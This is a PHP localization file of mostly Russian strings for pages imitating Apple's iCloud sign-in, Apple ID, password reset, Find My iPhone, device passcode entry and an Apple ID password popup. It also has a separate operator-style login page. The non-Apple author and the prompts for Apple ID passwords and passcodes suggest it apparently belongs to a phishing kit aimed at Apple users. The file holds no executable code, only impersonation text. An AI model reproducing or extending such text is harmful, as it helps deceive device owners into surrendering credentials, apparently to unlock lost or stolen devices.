<?php
/**
 * Created by PhpStorm.
 * User: mustapha
 * Date: 5/6/17
 * Time: 10:31 PM
 */

//- iCloud sign in page
$lang[ 'Singin_message' ] = "Войти в iCloud";
$lang[ 'Setup_message' ] = "Инструкции по настройке";
$lang[ 'Help_message' ] = "Помощь и поддержка";
$lang[ 'Password_message' ] = "Пароль";
$lang[ 'NewPassword_message' ] = "New password";
$lang[ 'ConfirmPassword_message' ] = "Confirm password";
$lang[ 'incorrect_message' ] = "Неверный Apple ID или пароль.";
$lang[ 'Keepsigin_message' ] = "Оставаться в системе";
$lang[ 'Forgotpassword_message' ] = "Забыли Apple ID или пароль?";
$lang[ 'Forgotpassword2_message' ] = "Забыли пароль?";
$lang[ 'DonthaveanAppleid_message' ] = "Нет Apple ID?";
$lang[ 'Createyoursnow_message' ] = "Создать Apple ID";
$lang[ 'Checkactivation_message' ] = "Проверка состояния блокировки активации";
$lang[ 'Systemstatus_message' ] = "Состояние системы";
$lang[ 'Privacy_message' ] = "Политика конфиденциальности";
$lang[ 'Terms_message' ] = "Условия и положения";
$lang[ 'Copyrights_message' ] = "Copyright © Apple Inc. Все права защищены.";
$lang[ 'iCloudsettings_message' ] = "Настройки iCloud";
$lang[ 'Signout_message' ] = "Выйти";
$lang[ 'VerificationFailed_message' ] = "Сбой проверки";
$lang[ 'OK_message' ] = "Повторить";

//- iCloud apps
$lang[ 'Reminders_message' ] = "Напоминания";
$lang[ 'Notes_message' ] = "Заметки";
$lang[ 'iCloudDrive_message' ] = "iCloud Drive";
$lang[ 'Photos_message' ] = "Фото";
$lang[ 'Contacts_message' ] = "Контакты";
$lang[ 'Mail_message' ] = "Почта";
$lang[ 'Settings_message' ] = "Настройки";
$lang[ 'FindMyiPhone_message' ] = "Найти iPhone";
$lang[ 'Keynote_message' ] = "Keynote";
$lang[ 'Numbers_message' ] = "Numbers";
$lang[ 'FindFriends_message' ] = "Найти друзей";
$lang[ 'Pages_message' ] = "Pages";

//- Maps connect Page
$lang[ 'Help_messages' ] = "Помогите";
$lang[ 'Createone_message' ] = "Create one";
$lang[ 'ForgotIDorPassword_message' ] = "Forgot ID or Password?";

//- iTunes Connect Page
$lang[ 'iTunesConnect_message' ] = "iTunes Connect";
$lang[ 'Rememberme_message' ] = "Запомнить меня";

//- Apple ID Page
$lang[ 'SignIn_message' ] = "Вход в учетную запись";
$lang[ 'CreateYourAppleID_message' ] = "Создание Apple ID";
$lang[ 'FAQ_message' ] = "Часто задаваемые вопросы";
$lang[ 'ManageyourAppleaccount_message' ] = "Управление учетной записью Apple";
$lang[ 'YourAppleIDorpasswordwasincorrect_message' ] = "Неверный Apple ID или пароль.";
$lang[ 'YouraccountforeverythingApple_message' ] = "Одна учетная запись для всех сервисов Apple";
$lang[ 'AsingleAppleIDandpasswordgivesyouaccesstoallAppleservices_message' ] = "С одним Apple ID и паролем Вы можете получить доступ ко всем сервисам Apple.";
$lang[ 'LearnmoreaboutAppleID_message' ] = "Подробнее об Apple ID";
$lang[ 'Morewaystoshop_message' ] = "О возможных способах покупки";
$lang[ 'Visitan_message' ] = "узнайте по телефону";
$lang[ '8-800-333-51-73_message' ] = "8-800-333-51-73:";
$lang[ 'or_message' ] = "или";
$lang[ 'findareseller_message' ] = "найдите реселлера.";
$lang[ 'Copyright©2018AppleInc_message' ] = "© Apple Inc., 2018 г.";
$lang[ 'Allrightsreserved_message' ] = "Все права защищены.";
$lang[ 'PrivacyPolicy_message' ] = "Политика конфиденциальности";
$lang[ 'UseofCookies_message' ] = "Использование cookies";
$lang[ 'TermsofUse_message' ] = "Условия использования";
$lang[ 'SalesandRefunds_message' ] = "Продажа и возврат";
$lang[ 'Legal_message' ] = "Юридическая информация";
$lang[ 'SiteMap_message' ] = "Карта сайта";

//- Compass Page
$lang[ 'FindMyiPhone_message' ] = "Найти iPhone";
$lang[ 'Sign-InRequired_message' ] = "Требуется вход";
$lang[ 'Not_message' ] = "Нет";

//- Reset Password Page
$lang[ 'ResetPassword_message' ] = "Сбросить пароль";
$lang[ 'PasswordChanged_message' ] = "Пароль изменен";
$lang[ 'YourAppleIDpasswordfor_message' ] = "Ваш идентификатор Apple ID";
$lang[ 'has_message' ] = "был";
$lang[ 'beenchanged_message' ] = "изменен";
$lang[ 'SignintoyourAppleIDaccountpagenowto_message' ] = "Войдите в свою учетную запись Apple ID прямо сейчас для";
$lang[ 'reviewyouraccountinformation_message' ] = "просмотра информации об аккаунте";
$lang[ 'GotoYourAccount_message' ] = "Перейти к Вашей учетной записи";
$lang[ 'Enteranewpassword_message' ] = "Введите новый пароль";
$lang[ 'oldpassword_message' ] = "старый пароль";
$lang[ 'newpassword_message' ] = "новый пароль";
$lang[ 'confirmpassword_message' ] = "подтвердите пароль";
$lang[ 'Yourpasswordmusthave_message' ] = "Ваш пароль должен состоять из";
$lang[ 'ormorecharacters_message' ] = "8 и более символов";
$lang[ 'Upperlowercaseletters_message' ] = "Прописные и строчные буквы";
$lang[ 'Atleastonenumber_message' ] = "Хотя бы одна цифра";
$lang[ 'Strength_message' ] = "Надежность пароля:";
$lang[ 'Avoidpasswordsthatareeasytoguessorusedwithotherwebsites_message' ] = "Не применяйте пароли, используемые для других сайтов, и пароли, которые можно легко подобрать.";
$lang[ 'YourAppleIDoroldpasswordwasincorrect_message' ] = "Неверный идентификатор Apple ID или пароль";
 
//- Login page
$lang[ 'Signsession_message' ] = "Войдите, чтобы начать сеанс";
$lang[ 'Alert_message' ] = "Предупреждение";
$lang[ 'Username_message' ] = "Имя пользователя";
$lang[ 'Password_message' ] = "Пароль";
$lang[ 'Signin_message' ] = "Войти";
$lang[ 'User_message' ] = "Пользователь";

//- General Lang
$lang[ 'appleid_message' ] = "Apple ID";
$lang[ 'Cancel_message' ] = "Отменить";
$lang[ 'required_message' ] = "обязательно";

//- Find my iphone page
$lang[ 'Alldevices_message' ] = "Все устройства";
$lang[ 'Locating_message' ] = "Идет поиск.";
$lang[ 'Alldevicesoffline_message' ] = "Все устройства не в сети";
$lang[ 'Nolocations_message' ] = "Невозможно показать местоположение, потому что все ваши устройства не в сети.";
$lang[ 'hourago_message' ] = "1 час назад";
$lang[ 'Playsound_message' ] = "Воспроизвести звук";
$lang[ 'Lostmode_message' ] = " B Режим пропажи";
$lang[ 'EraseiPhone_message' ] = "Стереть iPhone";
$lang[ 'Notifyfound_message' ] = "Уведомить меня о находке";
$lang[ 'Removeaccount_message' ] = "Удалить из «Найти iPhone»";
$lang[ 'Offline_message' ] = "Офлайн";

//- Passcode Page
$lang['access'] = "Need to find your device? Get quick access to:";
$lang['enterpasscode'] = "Enter passcode to contiune.";


//- New Fmi Template
$lang['manageappleid'] = "Gestiona tu cuenta de Apple";
$lang['No_Devices'] = "No Devices";
$lang['fmiSetup'] = "Set up your iCloud account on an iPhone, iPad, iPod touch or Mac to use Find My iPhone.";
$lang['MY_DEVICES'] = "MY DEVICES";
$lang['REFRESH'] = "REFRESH";
$lang['Seen_just_now'] = "Seen just now";
$lang['Old_Location'] = "Old Location";


//- FMI PopUp
$lang['Enter_the_password_Apple'] = "Введите пароль Apple ID для";
$lang['Apple_ID_Sign_Requested'] = "Вход в iCloud";
$lang['Turn_On_Send_Last_Location'] = "Включение функции «Последняя reo позиция»";
$lang['Allow_Find_My_iPhone_to_store_the_last'] = "Разрешить программе «Найти iPhone» хранить последнюю известную re°позицию этого iPad Bтечение 24 ч после разрядки аккумулятора.";
$lang['Not_Now'] = "Не сейчас";
$lang['Turn_On'] = "Включить";
$lang['Your_Apple_ID_or_password_is_incorrect'] = "Неверный Apple ID или пароль.";
$lang['Action'] = "уведомить о находке";
$lang['Updating_location'] = "1 минуту назад";
$lang['Try_Again'] = "Повторить";